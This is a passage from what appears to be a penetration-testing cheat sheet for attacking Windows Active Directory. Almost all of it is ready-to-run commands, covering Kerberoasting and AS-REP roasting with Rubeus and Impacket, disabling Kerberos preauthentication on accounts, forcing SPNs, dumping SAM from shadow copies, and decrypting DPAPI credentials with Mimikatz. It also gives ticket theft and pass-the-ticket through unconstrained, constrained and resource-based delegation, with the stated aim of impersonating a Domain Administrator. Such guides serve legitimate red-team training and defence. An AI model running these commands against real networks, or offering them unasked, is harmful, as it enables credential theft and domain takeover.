<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>  python GetUserSPNs.py &lt;DomainName&gt;/&lt;DomainUser&gt;:&lt;Password&gt; -outputfile &lt;FileName&gt;
</span></code></pre></div>
<ul>
<li>Rubeus:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>  #Kerberoasting and outputing on a file with a spesific format
</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>  Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt;
</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>
</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>  #Kerberoasting whle being &quot;OPSEC&quot; safe, essentially while not try to roast AES enabled accounts
</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>  Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /rc4opsec
</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>
</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>  #Kerberoast AES enabled accounts
</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a>  Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /aes
</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a>
</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a>  #Kerberoast spesific user account
</span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a>  Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /user:&lt;username&gt; /simple
</span><span id="__span-36-12"><a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a>
</span><span id="__span-36-13"><a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a>  #Kerberoast by specifying the authentication credentials
</span><span id="__span-36-14"><a id="__codelineno-36-14" name="__codelineno-36-14" href="#__codelineno-36-14"></a>  Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /creduser:&lt;username&gt; /credpassword:&lt;password&gt;
</span></code></pre></div>
<ul>
<li>ASREPRoast</li>
</ul>
<p><em>WUT IS DIS?:</em> \
 If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted<br />
 blob and bruteforce it offline.</p>
<ul>
<li>PowerView: <code>Get-DomainUser -PreauthNotRequired -Verbose</code></li>
<li>AD Module: <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth</code></li>
</ul>
<p>Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more!
Check for interesting permissions on accounts:</p>
<p><strong>Hint:</strong> We add a filter e.g. RDPUsers to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!</p>
<p>PowerView:</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="nb">Invoke-ACLScanner</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">IdentinyReferenceName</span> <span class="o">-match</span> <span class="s2">&quot;RDPUsers&quot;</span><span class="p">}</span>
</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="n">Disable</span> <span class="n">Kerberos</span> <span class="n">Preauth</span><span class="p">:</span>
</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">UserAccount</span><span class="p">&gt;</span> <span class="n">-XOR</span> <span class="p">@{</span><span class="n">useraccountcontrol</span><span class="p">=</span><span class="n">4194304</span><span class="p">}</span> <span class="n">-Verbose</span>
</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="n">Check</span> <span class="k">if</span> <span class="n">the</span> <span class="n">value</span> <span class="n">changed</span><span class="p">:</span>
</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="nb">Get-DomainUser</span> <span class="n">-PreauthNotRequired</span> <span class="n">-Verbose</span>
</span></code></pre></div>
<ul>
<li>And finally execute the attack using the <a href="https://github.com/HarmJ0y/ASREPRoast">ASREPRoast</a> tool.</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>  #Get a spesific Accounts hash:
</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>  Get-ASREPHash -UserName &lt;UserName&gt; -Verbose
</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>
</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>  #Get any ASREPRoastable Users hashes:
</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>  Invoke-ASREPRoast -Verbose
</span></code></pre></div>
<ul>
<li>Using Rubeus:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>  #Trying the attack for all domain users
</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>  Rubeus.exe asreproast /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;
</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>
</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>  #ASREPRoast spesific user
</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>  Rubeus.exe asreproast /user:&lt;username&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;
</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a>
</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a>  #ASREPRoast users of a spesific OU (Organization Unit)
</span><span id="__span-39-8"><a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a>  Rubeus.exe asreproast /ou:&lt;OUName&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;
</span></code></pre></div>
<ul>
<li>Using Impacket:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>  #Trying the attack for the specified users on the file
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>  python GetNPUsers.py &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -outputfile &lt;FileName&gt;
</span></code></pre></div>
<ul>
<li>Password Spray Attack</li>
</ul>
<p>If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse
on other domain accounts.</p>
<p><strong>Tools:</strong></p>
<ul>
<li><a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray</a></li>
<li><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></li>
<li><a href="https://github.com/wavestone-cdt/Invoke-CleverSpray">Invoke-CleverSpray</a></li>
<li>
<p><a href="https://github.com/Greenwolf/Spray">Spray</a></p>
</li>
<li>
<p>Force Set SPN</p>
</li>
</ul>
<p><em>WUT IS DIS ?:
If we have enough permissions -&gt; GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and bruteforce it.</em></p>
<ul>
<li>PowerView:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>  #Check for interesting permissions on accounts:
</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match &quot;RDPUsers&quot;}
</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>
</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>  #Check if current user has already an SPN setted:
</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>  Get-DomainUser -Identity &lt;UserName&gt; | select serviceprincipalname
</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>
</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>  #Force set the SPN on the account:
</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>  Set-DomainObject &lt;UserName&gt; -Set @{serviceprincipalname=&#39;ops/whatever1&#39;}
</span></code></pre></div>
<ul>
<li>AD Module:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>  #Check if current user has already an SPN setted
</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>  Get-ADUser -Identity &lt;UserName&gt; -Properties ServicePrincipalName | select ServicePrincipalName
</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>
</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>  #Force set the SPN on the account:
</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>  Set-ADUser -Identiny &lt;UserName&gt; -ServicePrincipalNames @{Add=&#39;ops/whatever1&#39;}
</span></code></pre></div>
<p>Finally use any tool from before to grab the hash and kerberoast it!</p>
<ul>
<li>Abusing Shadow Copies</li>
</ul>
<p>If you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c">#List shadow copies using vssadmin (Needs Admnistrator Access)</span>
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="n">vssadmin</span> <span class="n">list</span> <span class="n">shadows</span>
</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>
</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="c">#List shadow copies using diskshadow</span>
</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="n">diskshadow</span> <span class="n">list</span> <span class="n">shadows</span> <span class="n">all</span>
</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>
</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a><span class="c">#Make a symlink to the shadow copy and access it</span>
</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a><span class="n">mklink</span> <span class="p">/</span><span class="n">d</span> <span class="n">c</span><span class="p">:\</span><span class="n">shadowcopy</span> <span class="p">\\?\</span><span class="n">GLOBALROOT</span><span class="p">\</span><span class="n">Device</span><span class="p">\</span><span class="n">HarddiskVolumeShadowCopy1</span><span class="p">\</span>
</span></code></pre></div>
<ol>
<li>You can dump the backuped SAM database and harvest credentials.</li>
<li>Look for DPAPI stored creds and decrypt them.</li>
<li>
<p>Access backuped sensitive files.</p>
</li>
<li>
<p>List and Decrypt Stored Credentials using Mimikatz</p>
</li>
</ol>
<p>Usually encrypted credentials are stored in:</p>
<ul>
<li><code>%appdata%\Microsoft\Credentials</code></li>
<li><code>%localappdata%\Microsoft\Credentials</code></li>
</ul>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="c">#By using the cred function of mimikatz we can enumerate the cred object and get information about it:</span>
</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="n">dpapi</span><span class="p">::</span><span class="n">cred</span> <span class="p">/</span><span class="k">in</span><span class="p">:</span><span class="s2">&quot;%appdata%\Microsoft\Credentials\&lt;CredHash&gt;&quot;</span>
</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>
</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="c">#From the previous command we are interested to the &quot;guidMasterKey&quot; parameter, that tells us which masterkey was used to encrypt the credential</span>
</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="c">#Lets enumerate the Master Key:</span>
</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="n">dpapi</span><span class="p">::</span><span class="n">masterkey</span> <span class="p">/</span><span class="k">in</span><span class="p">:</span><span class="s2">&quot;%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;&quot;</span>
</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a>
</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a><span class="c">#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:</span>
</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a><span class="n">dpapi</span><span class="p">::</span><span class="n">masterkey</span> <span class="p">/</span><span class="k">in</span><span class="p">:</span><span class="s2">&quot;%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;&quot;</span> <span class="p">/</span><span class="n">rpc</span>
</span><span id="__span-44-10"><a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a>
</span><span id="__span-44-11"><a id="__codelineno-44-11" name="__codelineno-44-11" href="#__codelineno-44-11"></a><span class="c">#We now have the masterkey in our local cache:</span>
</span><span id="__span-44-12"><a id="__codelineno-44-12" name="__codelineno-44-12" href="#__codelineno-44-12"></a><span class="n">dpapi</span><span class="p">::</span><span class="n">cache</span>
</span><span id="__span-44-13"><a id="__codelineno-44-13" name="__codelineno-44-13" href="#__codelineno-44-13"></a>
</span><span id="__span-44-14"><a id="__codelineno-44-14" name="__codelineno-44-14" href="#__codelineno-44-14"></a><span class="c">#Finally we can decrypt the credential using the cached masterkey:</span>
</span><span id="__span-44-15"><a id="__codelineno-44-15" name="__codelineno-44-15" href="#__codelineno-44-15"></a><span class="n">dpapi</span><span class="p">::</span><span class="n">cred</span> <span class="p">/</span><span class="k">in</span><span class="p">:</span><span class="s2">&quot;%appdata%\Microsoft\Credentials\&lt;CredHash&gt;&quot;</span>
</span></code></pre></div>
<p>Detailed Article:
<a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials">DPAPI all the things</a></p>
<ul>
<li>Unconstrained Delegation</li>
</ul>
<p><em>WUT IS DIS ?: If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a
high value target or DA to connect to it, steal his TGT then ptt and impersonate him!</em></p>
<p>Using PowerView:</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="c">#Discover domain joined computers that have Unconstrained Delegation enabled</span>
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="nb">Get-NetComputer</span> <span class="n">-UnConstrained</span>
</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>
</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="c">#List tickets and check if a DA or some High Value target has stored its TGT</span>
</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;sekurlsa::tickets&quot;&#39;</span>
</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>
</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="c">#Command to monitor any incoming sessions on our compromised server</span>
</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a><span class="nb">Invoke-UserHunter</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">NameOfTheComputer</span><span class="p">&gt;</span> <span class="n">-Poll</span> <span class="p">&lt;</span><span class="n">TimeOfMonitoringInSeconds</span><span class="p">&gt;</span> <span class="n">-UserName</span> <span class="p">&lt;</span><span class="n">UserToMonitorFor</span><span class="p">&gt;</span> <span class="n">-Delay</span>
</span><span id="__span-45-9"><a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a><span class="p">&lt;</span><span class="n">WaitInterval</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
</span><span id="__span-45-10"><a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a>
</span><span id="__span-45-11"><a id="__codelineno-45-11" name="__codelineno-45-11" href="#__codelineno-45-11"></a><span class="c">#Dump the tickets to disk:</span>
</span><span id="__span-45-12"><a id="__codelineno-45-12" name="__codelineno-45-12" href="#__codelineno-45-12"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;sekurlsa::tickets /export&quot;&#39;</span>
</span><span id="__span-45-13"><a id="__codelineno-45-13" name="__codelineno-45-13" href="#__codelineno-45-13"></a>
</span><span id="__span-45-14"><a id="__codelineno-45-14" name="__codelineno-45-14" href="#__codelineno-45-14"></a><span class="c">#Impersonate the user using ptt attack:</span>
</span><span id="__span-45-15"><a id="__codelineno-45-15" name="__codelineno-45-15" href="#__codelineno-45-15"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;kerberos::ptt &lt;PathToTicket&gt;&quot;&#39;</span>
</span></code></pre></div>
<p><strong>Note:</strong> We can also use Rubeus!</p>
<ul>
<li>Constrained Delegation</li>
</ul>
<p>Using PowerView and Kekeo:</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="c">#Enumerate Users and Computers with constrained delegation</span>
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="nb">Get-DomainUser</span> <span class="n">-TrustedToAuth</span>
</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="nb">Get-DomainComputer</span> <span class="n">-TrustedToAuth</span>
</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>
</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a><span class="c">#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo</span>
</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a><span class="n">tgt</span><span class="p">::</span><span class="n">ask</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">Domain</span><span class="s1">&#39;s FQDN&gt; /rc4:&lt;hashedPasswordOfTheUser&gt;</span>
</span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a>
</span><span id="__span-46-8"><a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a><span class="s1">#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation</span>
</span><span id="__span-46-9"><a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a><span class="s1">tgs::s4u /tgt:&lt;PathToTGT&gt; /user:&lt;UserToImpersonate&gt;@&lt;Domain&#39;</span><span class="n">s</span> <span class="n">FQDN</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">service</span><span class="p">:&lt;</span><span class="n">Service</span><span class="s1">&#39;s SPN&gt;</span>
</span><span id="__span-46-10"><a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a>
</span><span id="__span-46-11"><a id="__codelineno-46-11" name="__codelineno-46-11" href="#__codelineno-46-11"></a><span class="s1">#Finally use mimikatz to ptt the TGS</span>
</span><span id="__span-46-12"><a id="__codelineno-46-12" name="__codelineno-46-12" href="#__codelineno-46-12"></a><span class="s1">Invoke-Mimikatz -Command &#39;</span><span class="s2">&quot;kerberos::ptt &lt;PathToTGS&gt;&quot;</span><span class="err">&#39;</span>
</span></code></pre></div>
<p><em>ALTERNATIVE:</em>
Using Rubeus:</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:&lt;</span><span class="n">NTLMhashedPasswordOfTheUser</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:&lt;</span><span class="n">UserToImpersonate</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="s2">&quot;&lt;Service&#39;s SPN&gt;&quot;</span> <span class="p">/</span><span class="n">altservice</span><span class="p">:&lt;</span><span class="n">Optional</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">ptt</span>
</span></code></pre></div>
<p>Now we can access the service as the impersonated user!</p>
<p>:triangular_flag_on_post: <strong>What if we have delegation rights for only a spesific SPN? (e.g TIME):</strong></p>
<p>In this case we can still abuse a feature of kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.</p>
<ul>
<li>Resource Based Constrained Delegation</li>
</ul>
<p><em>WUT IS DIS?: \
TL;DR \
If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access.</em></p>
<p>Tools we are going to use:</p>
<ul>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon">PowerView</a></li>
<li><a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a></li>
<li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
</ul>
<p>First we need to enter the security context of the user/machine account that has the privileges over the object.
If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.</p>
<p>Exploitation Example:</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="c">#Import Powermad and use it to create a new MACHINE ACCOUNT</span>
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="p">.</span> <span class="p">.\</span><span class="n">Powermad</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="p">&lt;</span><span class="n">MachineAccountName</span><span class="p">&gt;</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;p@ssword!&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span> <span class="n">-Verbose</span>
</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>
</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="c">#Import PowerView and get the SID of our new created machine account</span>
</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a><span class="p">.</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a><span class="nv">$ComputerSid</span> <span class="p">=</span> <span class="nb">Get-DomainComputer</span> <span class="p">&lt;</span><span class="n">MachineAccountName</span><span class="p">&gt;</span> <span class="n">-Properties</span> <span class="n">objectsid</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-Expand</span> <span class="n">objectsid</span>
</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a>
</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a><span class="c">#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:</span>
</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a><span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="p">$(</span><span class="nv">$ComputerSid</span><span class="p">)</span><span class="s2">)&quot;</span>
</span><span id="__span-48-11"><a id="__codelineno-48-11" name="__codelineno-48-11" href="#__codelineno-48-11"></a><span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
</span><span id="__span-48-12"><a id="__codelineno-48-12" name="__codelineno-48-12" href="#__codelineno-48-12"></a><span class="nv">$SD</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
</span><span id="__span-48-13"><a id="__codelineno-48-13" name="__codelineno-48-13" href="#__codelineno-48-13"></a>
</span><span id="__span-48-14"><a id="__codelineno-48-14" name="__codelineno-48-14" href="#__codelineno-48-14"></a><span class="c">#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we&#39;re taking over, again using PowerView</span>
</span><span id="__span-48-15"><a id="__codelineno-48-15" name="__codelineno-48-15" href="#__codelineno-48-15"></a><span class="nb">Get-DomainComputer</span> <span class="n">TargetMachine</span> <span class="p">|</span> <span class="nb">Set-DomainObject</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span> <span class="n">-Verbose</span>
</span><span id="__span-48-16"><a id="__codelineno-48-16" name="__codelineno-48-16" href="#__codelineno-48-16"></a>
</span><span id="__span-48-17"><a id="__codelineno-48-17" name="__codelineno-48-17" href="#__codelineno-48-17"></a><span class="c">#After that we need to get the RC4 hash of the new machine account&#39;s password using Rubeus</span>
</span><span id="__span-48-18"><a id="__codelineno-48-18" name="__codelineno-48-18" href="#__codelineno-48-18"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">hash</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="s1">&#39;p@ssword!&#39;</span>
</span><span id="__span-48-19"><a id="__codelineno-48-19" name="__codelineno-48-19" href="#__codelineno-48-19"></a>
</span><span id="__span-48-20"><a id="__codelineno-48-20" name="__codelineno-48-20" href="#__codelineno-48-20"></a><span class="c">#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus</span>
